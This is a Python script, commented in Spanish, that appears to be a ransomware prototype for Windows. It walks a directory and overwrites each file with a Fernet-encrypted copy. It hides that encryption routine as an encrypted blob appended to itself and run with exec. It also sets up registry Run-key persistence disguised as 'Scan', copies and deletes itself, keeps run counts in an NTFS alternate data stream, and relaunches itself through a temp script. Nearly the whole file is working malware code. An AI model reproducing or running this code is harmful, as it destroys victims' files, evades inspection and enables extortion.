#!/usr/bin/env python3
import os
import shutil
import winreg
import time
import tempfile
from cryptography.fernet import Fernet
import subprocess
import signal
from termcolor import colored
import allfiles1
import sys
#import cv2
import ctypes

# Crl C
def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo...\n", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def read_executions_from_ads(file_path):
    ads_path = f"{file_path}:executions"
    try:
        with open(ads_path, "r") as f:
            return int(f.read().strip())
    except FileNotFoundError:
        return 0

def write_executions_to_ads(file_path, value):
    ads_path = f"{file_path}:executions"
    with open(ads_path, "w") as f:
        f.write(str(value))


def on_logon_registry(c_dir, file_e):
    dest_dir = r"C:\Windows\System32"
    try:
        if file_e not in dest_dir:
            shutil.move(file_e, dest_dir)
        if file_e in c_dir:
            c_dir.remove(file_e)
        new_filepath = os.path.join(dest_dir, file_e)
        ctypes.windll.kernel32.SetFileAttributesW(new_filepath, 2)
        regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

        reghive = winreg.HKEY_CURRENT_USER
        reg = winreg.ConnectRegistry(None, reghive)
        key_reg = winreg.OpenKey(reg, regpath, 0, access=winreg.KEY_WRITE)
        winreg.SetValueEx(key_reg, "Scan", 0, winreg.REG_SZ, new_filepath)

    except Exception as e:
        pass
def tmp_task():
    #os.system(f'schtasks /create /tn "MyTask" /tr "python {script_path}" /sc onstart')
    if "executed_twice" not in os.environ:
        print("Creando archivo temporal para la segunda ejecución...")

        # Crear archivo temporal en la carpeta del sistema
        temp_dir = tempfile.gettempdir()
        temp_script_path = os.path.join(temp_dir, "temp_script.py")

        # Escribir un nuevo script Python en el archivo temporal
        with open(temp_script_path, 'w', encoding='utf-8') as temp_script:
            temp_script.write(
                "import subprocess\n"
                "import os\n\n"
                "# Código que se ejecutará desde el archivo temporal\n"
                "print('Ejecutando desde el archivo temporal.')\n\n"
                "# Ejecutar nuevamente el script original\n"
                f"subprocess.run(['python', '{sys.argv[0]}'])\n"
                "print(f'{sys.argv[0]}')"
            )

        print(f"Archivo temporal creado: {temp_script_path}")

        # Establecer una variable de entorno para evitar bucles infinitos
        os.environ["executed_twice"] = "1"

        # Ejecutar el script desde el archivo temporal
        subprocess.run([sys.executable, temp_script_path])
        executions = 2
        write_executions_to_ads(file_path_ads, executions)


    else:
        print("Segunda ejecución completada desde el archivo temporal.")

def c_e(code, key):
    fernet = Fernet(key)
    encrypted_code = fernet.encrypt(code.encode())
    return encrypted_code


def d_e(encrypted_code, key):
    fernet = Fernet(key)
    decrypted_code = fernet.decrypt(encrypted_code).decode()
    return decrypted_code



def gen_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)



def return_key():
    return open('key.key', 'rb').read()



def file_encrypt(files, key):
    fernet = Fernet(key)
    for filepath in files:
        with open(filepath, "rb") as file:
            data_to_encrypt = file.read()
        data = fernet.encrypt(data_to_encrypt)

        # Guardar el archivo cifrado
        with open(filepath, "wb") as file:
            file.write(data)

def replicated():
    current_file= __file__
    filedir = os.path.join(os.getcwd(), "Note")
    filename =sys.argv[0]
    filepath = os.path.join(filedir, filename)
    try:
        shutil.copy2(filename, filedir)
        time.sleep(2)
        os.remove(current_file)
    except Exception as e:
        pass
def self_modifying_code(keycode):
    new_code = """
encrypted_code = b'{encrypted_code}'
exec(d_e(encrypted_code, b'{key}'))
"""

    code_to_add = r'''
def open_video(f_video):
    while (video_f.isOpened()):
        ret, image = video_f.read()
        if ret == False:
            break
        f_video.imshow('Imagen', im)
        if cv2.waitKey(1) & 0xFF == 27:
            break
    f_video.release()
    cv2.destroyAllWindows()

def file_encrypt(files, key):
    fernet = Fernet(key)
    try:
        for filepath in files:  
            with open(filepath, "rb") as file:  
                data_to_encrypt = file.read()
            data = fernet.encrypt(data_to_encrypt)
    
            with open(filepath, "wb") as file:  
                file.write(data)
    except Exception as e:
        pass


base_directory = r"C:\Users\Lenovo\OneDrive\Desktop\encrypt"
allfiles1.searching_files(base_directory)
files = allfiles1.file_list

#video = cv2.VideoCapture('formacion_random.mp4')
if executions != 2:
    gen_key()
    key = return_key()

    file_encrypt(files, key)
time.sleep(5)
subprocess.run(["python3", "interface.py"])
#open_video(video)
'''

    encrypted_code = c_e(code_to_add, keycode).decode()
    formatted_code = new_code.format(encrypted_code=encrypted_code, key=keycode.decode())

    current_file = __file__
    with open(current_file, 'a') as f:
        f.write(formatted_code)

def main():


    current_dir = os.path.dirname(os.path.abspath(__file__))
    py_e = "art.exe"

    #on_logon_registry(current_dir, py_e)
    keycode = Fernet.generate_key()
    script_path = os.path.abspath(__file__)
    if executions != 2:
        self_modifying_code(keycode)

    #subprocess.run(["python3", "ads_file.py", "texto3.txt", "-a", "art.py"])
    #time.sleep(10)




if __name__ == '__main__':
    file_path_ads = "C:\\Windows\win.txt"
    executions = read_executions_from_ads(file_path_ads)
    main()
    if executions != 2:
        tmp_task()




